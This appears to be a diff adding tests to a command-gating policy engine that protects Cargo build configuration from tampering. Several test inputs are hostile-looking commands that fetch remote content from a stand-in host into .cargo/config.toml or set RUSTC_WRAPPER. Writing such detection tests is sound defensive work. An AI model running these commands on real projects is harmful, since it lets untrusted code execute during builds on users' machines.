@@ -231,3 +231,28 @@ def test_policy_loads_cargo_exec_from_yaml(tmp_path):
 def test_rule_registered_in_builtins():
     from aegis.rules import BUILTIN_RULES, rule_cargo_exec_protect
     assert rule_cargo_exec_protect in BUILTIN_RULES
+
+
+# ---- QA round 1 fixes ----------------------------------------------------------
+def test_fetch_redirect_into_config_gated():
+    for c in ("curl -sSL https://e.example/x > .cargo/config.toml",
+              "wget -qO- https://e.example/x | tee .cargo/config.toml",
+              "curl -s https://e.example/x >> ~/.cargo/config"):
+        assert evaluate(_shell(c), EMPTY).action != Action.ALLOW, c
+
+
+def test_config_as_source_not_gated():
+    for c in ("cp .cargo/config.toml /tmp/backup.toml",
+              "mv .cargo/config.toml .cargo/config.toml.bak"):
+        assert not _hit(_shell(c))[0], c
+
+
+def test_write_branch_allow_list_and_deny_shell():
+    p = Policy(cargo_exec={"allow": [r"\.cargo/config\.toml"]})
+    assert not _hit(_write(".cargo/config.toml", 'rustc-wrapper = "x"'), p)[0]
+    ok, d = _hit(_shell("export RUSTC_WRAPPER=/x"), DENY)
+    assert ok and d.action == Action.DENY
+
+
+def test_mode_false_is_off():
+    assert not _hit(_shell("export RUSTC_WRAPPER=/x"), Policy(cargo_exec={"mode": False}))[0]
